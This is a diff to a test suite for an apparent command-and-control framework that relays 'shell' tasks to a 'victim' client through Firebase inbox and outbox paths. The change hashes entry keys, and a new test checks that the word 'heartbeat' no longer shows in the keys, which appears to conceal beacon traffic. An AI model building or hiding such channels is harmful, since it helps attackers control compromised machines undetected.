@@ -58,34 +58,48 @@ def error_response(status_code=500):
 # ---------------------------------------------------------------------------
 
 class TestEntryKey:
-    def test_normal_row_uses_command_id(self):
-        from channel.firebase import _entry_key
-        assert _entry_key({"command_id": "abc123", "status": "pending"}) == "abc123"
+    def test_normal_row_returns_hash_of_command_id(self):
+        from channel.firebase import _entry_key, _path_key
+        assert _entry_key({"command_id": "abc123", "status": "pending"}) == _path_key("abc123")
 
-    def test_success_status_uses_command_id(self):
-        from channel.firebase import _entry_key
-        assert _entry_key({"command_id": "abc123", "status": "success"}) == "abc123"
+    def test_success_status_returns_hash(self):
+        from channel.firebase import _entry_key, _path_key
+        assert _entry_key({"command_id": "abc123", "status": "success"}) == _path_key("abc123")
 
     def test_fragment_index_0(self):
-        from channel.firebase import _entry_key
-        assert _entry_key({"command_id": "abc123", "status": "frag:0:3"}) == "abc123_f0"
+        from channel.firebase import _entry_key, _path_key
+        assert _entry_key({"command_id": "abc123", "status": "frag:0:3"}) == f"{_path_key('abc123')}_f0"
 
     def test_fragment_index_mid(self):
-        from channel.firebase import _entry_key
-        assert _entry_key({"command_id": "abc123", "status": "frag:2:3"}) == "abc123_f2"
+        from channel.firebase import _entry_key, _path_key
+        assert _entry_key({"command_id": "abc123", "status": "frag:2:3"}) == f"{_path_key('abc123')}_f2"
 
-    def test_missing_status_uses_command_id(self):
-        from channel.firebase import _entry_key
-        assert _entry_key({"command_id": "abc123"}) == "abc123"
+    def test_missing_status_returns_hash(self):
+        from channel.firebase import _entry_key, _path_key
+        assert _entry_key({"command_id": "abc123"}) == _path_key("abc123")
 
     def test_frag_without_total_still_extracts_index(self):
-        from channel.firebase import _entry_key
-        # "frag:0" has no total count but index 0 is still extractable
-        assert _entry_key({"command_id": "abc123", "status": "frag:0"}) == "abc123_f0"
+        from channel.firebase import _entry_key, _path_key
+        assert _entry_key({"command_id": "abc123", "status": "frag:0"}) == f"{_path_key('abc123')}_f0"
 
     def test_malformed_frag_non_numeric_index_falls_back(self):
+        from channel.firebase import _entry_key, _path_key
+        assert _entry_key({"command_id": "abc123", "status": "frag:notint:3"}) == _path_key("abc123")
+
+    def test_heartbeat_command_id_does_not_appear_in_key(self):
         from channel.firebase import _entry_key
-        assert _entry_key({"command_id": "abc123", "status": "frag:notint:3"}) == "abc123"
+        key = _entry_key({"command_id": "heartbeat-abc123", "status": "heartbeat"})
+        assert "heartbeat" not in key
+
+    def test_path_key_is_deterministic(self):
+        from channel.firebase import _path_key
+        assert _path_key("abc123") == _path_key("abc123")
+
+    def test_path_key_is_opaque_hex(self):
+        from channel.firebase import _path_key
+        key = _path_key("heartbeat-some-uuid")
+        assert all(c in "0123456789abcdef" for c in key)
+        assert len(key) == 12
 
 
 # ---------------------------------------------------------------------------
@@ -398,23 +412,23 @@ class TestReadOutbox:
 # ---------------------------------------------------------------------------
 
 class TestWriteTask:
-    def test_puts_to_inbox_url_keyed_by_command_id(self, firebase_env):
-        from channel.firebase import FirebaseChannel
+    def test_puts_to_inbox_url_keyed_by_hash(self, firebase_env):
+        from channel.firebase import FirebaseChannel, _path_key
         task = {"command_id": "abc123", "command": "shell", "payload": "{}",
                 "target": "", "status": "pending", "created_at": "t"}
         with patch("requests.put", return_value=ok_response()) as mock_put:
             FirebaseChannel().write_task(task)
         url = mock_put.call_args[0][0]
-        assert "c2/inbox/abc123.json" in url
+        assert f"c2/inbox/{_path_key('abc123')}.json" in url
 
     def test_fragment_keyed_with_fN_suffix(self, firebase_env):
-        from channel.firebase import FirebaseChannel
+        from channel.firebase import FirebaseChannel, _path_key
         task = {"command_id": "abc123", "command": "shell", "payload": "chunk",
                 "target": "", "status": "frag:1:3", "created_at": "t"}
         with patch("requests.put", return_value=ok_response()) as mock_put:
             FirebaseChannel().write_task(task)
         url = mock_put.call_args[0][0]
-        assert "c2/inbox/abc123_f1.json" in url
+        assert f"c2/inbox/{_path_key('abc123')}_f1.json" in url
 
     def test_returns_true_on_success(self, firebase_env):
         from channel.firebase import FirebaseChannel
@@ -436,14 +450,14 @@ class TestWriteTask:
 # ---------------------------------------------------------------------------
 
 class TestWriteResult:
-    def test_puts_to_outbox_url_keyed_by_command_id(self, firebase_env):
-        from channel.firebase import FirebaseChannel
+    def test_puts_to_outbox_url_keyed_by_hash(self, firebase_env):
+        from channel.firebase import FirebaseChannel, _path_key
         result = {"command_id": "abc123", "client_id": "victim",
                   "status": "success", "result": "ok", "timestamp": "t"}
         with patch("requests.put", return_value=ok_response()) as mock_put:
             FirebaseChannel().write_result(result)
         url = mock_put.call_args[0][0]
-        assert "c2/outbox/abc123.json" in url
+        assert f"c2/outbox/{_path_key('abc123')}.json" in url
 
     def test_returns_true_on_success(self, firebase_env):
         from channel.firebase import FirebaseChannel
@@ -459,11 +473,11 @@ class TestWriteResult:
 
 class TestDeleteTask:
     def test_sends_delete_to_inbox_entry_url(self, firebase_env):
-        from channel.firebase import FirebaseChannel
+        from channel.firebase import FirebaseChannel, _path_key
         with patch("requests.delete", return_value=ok_response()) as mock_del:
             FirebaseChannel().delete_task("abc123")
         url = mock_del.call_args[0][0]
-        assert "c2/inbox/abc123.json" in url
+        assert f"c2/inbox/{_path_key('abc123')}.json" in url
 
     def test_returns_true_on_success(self, firebase_env):
         from channel.firebase import FirebaseChannel
@@ -478,11 +492,11 @@ class TestDeleteTask:
 
 class TestDeleteResult:
     def test_sends_delete_to_outbox_entry_url(self, firebase_env):
-        from channel.firebase import FirebaseChannel
+        from channel.firebase import FirebaseChannel, _path_key
         with patch("requests.delete", return_value=ok_response()) as mock_del:
             FirebaseChannel().delete_result("abc123")
         url = mock_del.call_args[0][0]
-        assert "c2/outbox/abc123.json" in url
+        assert f"c2/outbox/{_path_key('abc123')}.json" in url
 
     def test_returns_true_on_success(self, firebase_env):
         from channel.firebase import FirebaseChannel
@@ -646,6 +660,7 @@ class TestDeleteTaskEntryWrapper:
 
 class TestDeleteOutboxEntryWrapper:
     def test_calls_delete_result_on_firebase_channel(self, firebase_env):
+        from channel.firebase import _path_key
         import common
         common._active_channel = None
         with patch("requests.delete", return_value=ok_response()) as mock_del:
@@ -653,7 +668,7 @@ class TestDeleteOutboxEntryWrapper:
         urls = [call[0][0] for call in mock_del.call_args_list]
         assert len(urls) == 1, "only outbox should be deleted"
         assert "outbox" in urls[0]
-        assert "hb123" in urls[0]
+        assert _path_key("hb123") in urls[0]
 
     def test_does_not_delete_inbox(self, firebase_env):
         import common
